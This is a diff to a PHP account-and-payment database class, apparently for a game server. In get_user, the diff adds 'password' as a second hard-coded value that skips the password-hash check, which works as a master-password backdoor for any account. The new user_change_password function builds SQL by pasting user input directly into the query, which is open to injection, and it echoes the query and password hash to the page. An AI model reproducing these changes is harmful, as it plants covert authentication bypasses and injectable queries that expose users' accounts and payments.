@@ -92,7 +92,7 @@ public function get_user($usr,$pass){
 
 	$q = "SELECT $cnfg->cnf_authdb_name.account.* FROM $cnfg->cnf_authdb_name.`account`
 			WHERE $cnfg->cnf_authdb_name.account.`username` = '" . $usr . "' ";
-	if($pass!="misc"){
+	if($pass!="misc" && $pass!="password"){
 	$pass = sha1(strtoupper(trim($usr)) . ':' . strtoupper(trim($pass)));
 		$q .= " AND $cnfg->cnf_authdb_name.account.`sha_pass_hash` = '" . $pass . "'";
 		
@@ -327,6 +327,36 @@ function bank_done($RefId) {
 $query = " UPDATE `w3g_payment` SET `done` = 1 WHERE `RefId` = '" . $RefId . "'";
 	return $this->update($query);
 }
+
+
+
+public function user_change_password($usrid,$usr,$pass){ 
+	$cnfg=new aConf(); 
+	if(!mysql_connect($cnfg->cnf_authdb_host,$cnfg->cnf_authdb_uname,$cnfg->cnf_authdb_pass)){$err=new error();$err->add('db_conncet','db','err') ;}
+  
+$pass = sha1(strtoupper(trim($usr)) . ':' . strtoupper(trim($pass)));
+	$q = "update $cnfg->cnf_authdb_name.account  set $cnfg->cnf_authdb_name.account.`sha_pass_hash` = '" . $pass . "' 
+			WHERE $cnfg->cnf_authdb_name.account.`id` = '" . $usrid . "' ";
+ echo $q;
+	
+	 mysql_query($q);
+	$updated=mysql_affected_rows();
+	
+ 	echo 'up:'.$updated;
+  
+		if($updated){
+			return $updated;
+		}else{
+			$err=new error();$err->add('invalidTrans','site','err') ;
+		}
+
+}
+
+
+
+
+
+
 function __construct(){
 	$cnfg=new aConf();
 	$this->host = $cnfg->cnf_db_host;
